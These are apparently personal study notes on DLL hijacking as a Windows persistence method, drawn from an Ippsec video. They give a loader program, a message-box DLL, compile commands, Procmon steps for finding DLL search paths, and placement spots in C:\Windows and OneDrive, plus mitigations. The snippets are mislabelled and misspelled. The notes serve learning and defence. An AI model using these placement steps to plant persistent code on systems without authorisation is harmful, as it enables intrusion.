
## DLL-Hijacking

## Ippsec Video

[Ippsec's All About DLL Hijacking - My Favorite Persistence Method ](https://www.youtube.com/watch?v=3eROsG_WNpE)

bad.dll
```C
#include <windows.h>
#include <stdio.h>

int main( void )
{
	HINSTANCE hDll;
	
	// Load a DLL
	hDll = LoadLibrary(TEXT("bad.dll"));
	
	// If DLL was loaded
	if (hDll != NULL){
		printf("DLL Found\n");
	} else {
		printf("DLL Not Found\n");
	} 

	return 0;
}
```

Hello.c
```c
#include <windows.h>

BOOL WINAPI
DllMAin (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
		case DLL_PROCESS_ATTACH:
			MessageBox(NULL, //Owner
				"Hello and welcome to DLL hijacking subscribe to Ippsec", // Message
				"ippsec", //Title
				MB_ICONERROR | MB_OK // TYPE
				);
			break;	
		}			
return TRUE;	
}
```

```bash
x86_64-w64-mingw32-gcc-win32 hello.c -o test.exe
x86_64-w64-mingw32-gcc-win32 dll.c -o bad.dll -shared # shared to make it a dll
```

Transfering just the executable and not the dll, using [[Sysinternals-Procmon]] to `Filter -> Process Name is test.exe -> Apply and ok` then running test.exe we can observer path recursion looking for the missing bad.dll. If you write to any of the locations that recursively searched for or we can put it in the current working directory we can do DLL Hijacking. Similarly if we can inject into a misconfigured `%PATH%` where system32 is not the first in the listing we can also perform DLL Hijacking

```powershell
echo %PATH%
```

"Known DLLs" are not Hijackable 
- `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\ControlSession Manager\KnownDLLs`

The power of this persistence method comes from placing the dll in difficult to find locations. 

Ippsec demonstrates that if we can write in `c:\Windows` we can hijack most of the dll's explorer.exe loads from system32 as the recursive search has not yet had to recurse to the child directory. Explorer is relative unique binary in that there are very few in `c:\Windows` directory Ippsec uses `csapi.dll` and points out that some dlls are not really used this being one of them, but is still loaded by explorer.exe. Similiarly he just downloads the dll to OneDrive executable directory and hijacks it by once again placing it within a position in the path to which it will be loaded first.

## Mitigations

- **Append** additional path variables do not **Prepend** default directorys
- Check third party software post-installation directory permissions with `icacls.exe`
	- Commonly third party apps will misconfigure your system that allow for this exploited 


## References

[Ippsec's All About DLL Hijacking - My Favorite Persistence Method ](https://www.youtube.com/watch?v=3eROsG_WNpE)